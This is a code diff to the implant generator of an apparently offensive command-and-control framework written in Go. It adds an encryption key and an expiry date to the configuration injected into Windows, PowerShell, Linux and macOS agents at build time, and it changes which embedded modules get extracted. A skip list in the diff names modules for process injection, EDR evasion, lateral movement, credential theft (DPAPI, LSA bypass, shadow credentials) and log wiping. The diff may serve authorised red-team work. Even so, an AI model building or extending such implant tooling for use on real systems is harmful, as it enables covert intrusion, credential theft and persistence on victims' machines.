@@ -116,9 +116,9 @@ type MalleableProfile struct {
 	Jitter      int               `json:"jitter"`
 }
 
-// AgentConfig holds parameters injected into the generated agent (EXE or PS1).
+// ImplantConfig holds parameters injected into the generated agent (EXE or PS1).
 // All agents must be produced exclusively through the Generate page.
-type AgentConfig struct {
+type ImplantConfig struct {
 	C2URL         string
 	Protocol      string // http, tcp, p2p
 	Interval      int
@@ -138,10 +138,12 @@ type AgentConfig struct {
 	DNSDomain     string // DNS C2 domain (e.g. "c2.example.com")
 	DNSServer     string // DNS C2 server IP
 	Proxy         string // HTTP proxy URL (e.g. "http://proxy:8080")
+	CryptoKey     string // 32-byte hex key for StreamCipher (empty = disabled)
+	ExpiryDate    string // Compile-time expiry date "YYYY-MM-DD" (empty = disabled)
 }
 
 // GenerateWindowsEXE builds the Windows agent EXE (only via Generate page) using the embedded agent source + ldflags injection.
-func GenerateWindowsEXE(cfg AgentConfig, outputDir string) (string, error) {
+func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 	if cfg.C2URL == "" {
 		cfg.C2URL = "http://127.0.0.1:8080"
 	}
@@ -199,16 +201,6 @@ require (
 		return "", err
 	}
 
-	// Also write go.sum entries for the two deps
-	goSum := `github.com/Microsoft/go-winio v0.6.2 h1:F2VQgta7ecxGYO8k3ZZz3RS8fVIXVxONVUPlNERoyfY=
-github.com/Microsoft/go-winio v0.6.2/go.mod h1:yd8OoFMLzJbo9gZq8j5qaps8bJ9aShtEA8Ipt1oGCvU=
-golang.org/x/sys v0.42.0 h1:omrd2nAlyT5ESRdCLYdm3+fMfNFE/+Rf4bDIQImRJeo=
-golang.org/x/sys v0.42.0/go.mod h1:4GL1E5IUh+htKOUEOaiffhrAeqysfVGipDYzABqnCmw=
-`
-	if err := os.WriteFile(filepath.Join(tmpDir, "go.sum"), []byte(goSum), 0644); err != nil {
-		return "", err
-	}
-
 	// ldflags to inject vars - properly quoted to handle spaces/special chars in UserAgent etc.
 	// Note: only string vars can be set with -X, so we target the *Str versions (parsed inside agent).
 	userAgent := cfg.UserAgent
@@ -240,7 +232,7 @@ golang.org/x/sys v0.42.0/go.mod h1:4GL1E5IUh+htKOUEOaiffhrAeqysfVGipDYzABqnCmw=
 		p2pListenAddr = cfg.P2PListenAddr
 	}
 
-	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s"`,
+	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s"`,
 		escape(cfg.C2URL),
 		cfg.Interval,
 		cfg.Jitter,
@@ -257,6 +249,8 @@ golang.org/x/sys v0.42.0/go.mod h1:4GL1E5IUh+htKOUEOaiffhrAeqysfVGipDYzABqnCmw=
 		escape(cfg.DNSDomain),
 		escape(cfg.DNSServer),
 		escape(cfg.Proxy),
+		escape(cfg.CryptoKey),
+		escape(cfg.ExpiryDate),
 	)
 
 	// Output filename
@@ -322,7 +316,7 @@ golang.org/x/sys v0.42.0/go.mod h1:4GL1E5IUh+htKOUEOaiffhrAeqysfVGipDYzABqnCmw=
 
 // GeneratePowerShellSource returns the complete PowerShell agent source code
 // after executing the external template. This is the single source of truth.
-func GeneratePowerShellSource(cfg AgentConfig) (string, error) {
+func GeneratePowerShellSource(cfg ImplantConfig) (string, error) {
 	if cfg.C2URL == "" {
 		cfg.C2URL = "http://127.0.0.1:8080"
 	}
@@ -371,7 +365,7 @@ func GeneratePowerShellSource(cfg AgentConfig) (string, error) {
 
 // GeneratePowerShell creates a .ps1 agent file on disk (only via Generate page).
 // Internally uses the full template.
-func GeneratePowerShell(cfg AgentConfig, outputDir string) (string, error) {
+func GeneratePowerShell(cfg ImplantConfig, outputDir string) (string, error) {
 	ps1Code, err := GeneratePowerShellSource(cfg)
 	if err != nil {
 		return "", err
@@ -391,37 +385,56 @@ func GeneratePowerShell(cfg AgentConfig, outputDir string) (string, error) {
 	return outPath, nil
 }
 
-// extractAgentSources writes the required Go agent source files (common + platform)
-// from the embedded FS into the temp build directory. This enables cross-platform
-// builds (windows/linux) with correct build-tagged files.
+// extractAgentSources writes ALL Go agent source files from the embedded FS
+// into the temp build directory. This enables cross-platform builds (windows/linux).
 func extractAgentSources(efs embed.FS, dir string) error {
-	files := []string{
-		"agent/agent.go",
-		"agent/agent_windows.go",
-		"agent/agent_linux.go",
-		"agent/bof.go",
-		"agent/peloader.go",
-		"agent/dns.go",
+	entries, err := efs.ReadDir("agent")
+	if err != nil {
+		return fmt.Errorf("failed to read embedded agent dir: %w", err)
 	}
-	for _, f := range files {
-		data, err := efs.ReadFile(f)
-		if err != nil {
-			// platform file may be optional in some future, but require core
-			if f == "agent/agent.go" {
-				return fmt.Errorf("failed to read embedded %s: %w", f, err)
-			}
-			continue // ignore missing platform for now
+	hasAgentGo := false
+	for _, entry := range entries {
+		if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".go") {
+			continue
 		}
-		base := filepath.Base(f)
-		if err := os.WriteFile(filepath.Join(dir, base), data, 0644); err != nil {
+		// Skip ICMP/SMB transport (external deps) and Windows-only files (NT syscalls etc.)
+		skipKeywords := []string{"transport_icmp_", "transport_smb_",
+			"injection_ntcreatethreadex", "injection_earlybird_", "injection_threadless_",
+			"evasion_blockdlls_", "evasion_protect_", "evasion_veh_unhook_",
+			"lateral_psexec_", "lateral_wmi_", "lateral_dcom_", "lateral_winrm_", "lateral_scf_",
+			"credentials_dpapi_", "credentials_lsa_bypass_", "credentials_adcs_", "credentials_shadow_creds_",
+			"cleanup_self_delete_", "cleanup_log_wipe_", "cleanup_track_wipe_",
+			"scanner_smb_",
+			"trans_rdp_", "trans_ssh_"}
+		skip := false
+		for _, kw := range skipKeywords {
+			if strings.Contains(entry.Name(), kw) {
+				skip = true
+				break
+			}
+		}
+		if skip {
+			continue
+		}
+		if entry.Name() == "agent.go" {
+			hasAgentGo = true
+		}
+		data, err := efs.ReadFile("agent/" + entry.Name())
+		if err != nil {
+			return fmt.Errorf("failed to read embedded agent/%s: %w", entry.Name(), err)
+		}
+		if err := os.WriteFile(filepath.Join(dir, entry.Name()), data, 0644); err != nil {
 			return err
 		}
+	}
+	if !hasAgentGo {
+		return fmt.Errorf("embedded agent directory missing agent.go")
 	}
 	return nil
 }
 
 // GenerateLinuxELF builds a Linux ELF agent binary via cross-compilation.
-func GenerateLinuxELF(cfg AgentConfig, outputDir string) (string, error) {
+func GenerateLinuxELF(cfg ImplantConfig, outputDir string) (string, error) {
 	if cfg.C2URL == "" {
 		cfg.C2URL = "http://127.0.0.1:8080"
 	}
@@ -468,6 +481,11 @@ func GenerateLinuxELF(cfg AgentConfig, outputDir string) (string, error) {
 	goMod := `module agent
 
 go 1.25
+
+require (
+	golang.org/x/net v0.42.0
+	golang.org/x/sys v0.42.0
+)
 `
 	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
 		return "", err
@@ -501,7 +519,7 @@ go 1.25
 		p2pListenAddr = cfg.P2PListenAddr
 	}
 
-	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s"`,
+	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s"`,
 		escape(cfg.C2URL),
 		cfg.Interval,
 		cfg.Jitter,
@@ -518,6 +536,8 @@ go 1.25
 		escape(cfg.DNSDomain),
 		escape(cfg.DNSServer),
 		escape(cfg.Proxy),
+		escape(cfg.CryptoKey),
+		escape(cfg.ExpiryDate),
 	)
 
 	outName := cfg.Filename
@@ -570,7 +590,7 @@ go 1.25
 }
 
 // GenerateMacOS builds a macOS agent binary via cross-compilation.
-func GenerateMacOS(cfg AgentConfig, outputDir string) (string, error) {
+func GenerateMacOS(cfg ImplantConfig, outputDir string) (string, error) {
 	if cfg.C2URL == "" {
 		cfg.C2URL = "http://127.0.0.1:8080"
 	}
@@ -617,6 +637,11 @@ func GenerateMacOS(cfg AgentConfig, outputDir string) (string, error) {
 	goMod := `module agent
 
 go 1.25
+
+require (
+	golang.org/x/net v0.42.0
+	golang.org/x/sys v0.42.0
+)
 `
 	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
 		return "", err
@@ -650,7 +675,7 @@ go 1.25
 		p2pListenAddr = cfg.P2PListenAddr
 	}
 
-	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s"`,
+	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s"`,
 		escape(cfg.C2URL),
 		cfg.Interval,
 		cfg.Jitter,
@@ -667,6 +692,8 @@ go 1.25
 		escape(cfg.DNSDomain),
 		escape(cfg.DNSServer),
 		escape(cfg.Proxy),
+		escape(cfg.CryptoKey),
+		escape(cfg.ExpiryDate),
 	)
 
 	outName := cfg.Filename
